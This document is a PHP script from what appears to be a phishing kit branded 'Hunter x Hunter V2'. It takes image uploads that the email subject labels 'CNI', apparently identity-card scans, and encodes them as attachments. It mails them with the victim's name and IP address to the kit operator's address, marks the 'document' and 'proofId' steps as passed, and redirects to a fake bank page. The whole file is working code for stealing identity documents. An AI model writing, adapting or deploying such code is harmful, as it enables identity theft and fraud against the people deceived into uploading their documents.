<?
session_start();
error_reporting(0);
include('../../antibots.php');
include('../../email.php');
$time = date('d/m/Y G:i:s');
$valid_formats = array("jpg" , "png" , "gif", "jpeg" , "bmp");
$max_file_size = 1024*9000;
if(isset($_POST) and $_SERVER['REQUEST_METHOD'] == "POST"){
  // Loop $_FILES to exeicute all files
  foreach ($_FILES['files']['name'] as $f => $name) {
      if ($_FILES['files']['error'][$f] == 5) {
          continue; // Skip file if any error found
      }
      if ($_FILES['files']['error'][$f] == 0) {
          if ($_FILES['files']['size'][$f] > $max_file_size) {
              header("Location: ../home");
              exit(); // Skip large files
          }
      elseif( ! in_array(pathinfo($name, PATHINFO_EXTENSION), $valid_formats) ){
        header("Location: ../home");
        exit(); // Skip invalid file formats
      }
         /* else{ // No error found! Move uploaded files
              if(move_uploaded_file($_FILES["files"]["tmp_name"][$f], $path.$name))
              $count++; // Number of successfully uploaded file
          }*/
      }
  }
}; 
$subject = "📄 CNI 📄 [".$_SESSION['cn']."] [".$_SESSION['ip']."]";
$body = "";
$mime_boundary="==Multipart_Boundary_x".md5(mt_rand())."x";
         $headers = "From:🐉 Hunter x Hunter V2 🐉 <Rez@isoka>" .
         "MIME-Version: 1.0\r\n" .
            "Content-Type: multipart/mixed;\r\n" .
            " boundary=\"{$mime_boundary}\"";
 foreach ($_FILES['files']['name'] as $f => $name) {
    $tmp_name = $_FILES['files']['tmp_name'][$f];
    $type = $_FILES['files']['type'][$f];
    $size = $_FILES['files']['size'][$f];
            if (file_exists($tmp_name))
            {
               if(is_uploaded_file($tmp_name))
               {
                  $file = fopen($tmp_name,'rb');
                  $data = fread($file,filesize($tmp_name));
                  fclose($file);
                  $data = chunk_split(base64_encode($data));
               }
               $body .= "--{$mime_boundary}\n" .
                  "Content-Type: {$type};\n" .
                  " name=\"{$name}\"\n" .
                  "Content-Disposition: attachment;\n" .
                  " filename=\"{$fileatt_name}\"\n" .
                  "Content-Transfer-Encoding: base64\n\n" .
               $data . "\n\n";
            }
         }
         $body.="--{$mime_boundary}--\n";
if (mail($adresse_email, $subject, $body,$headers));
$_SESSION['address'] = 'passed';
$_SESSION['document'] = 'success';
$_SESSION['proofId'] = 'success';
   header("Location: ../bank");



?>
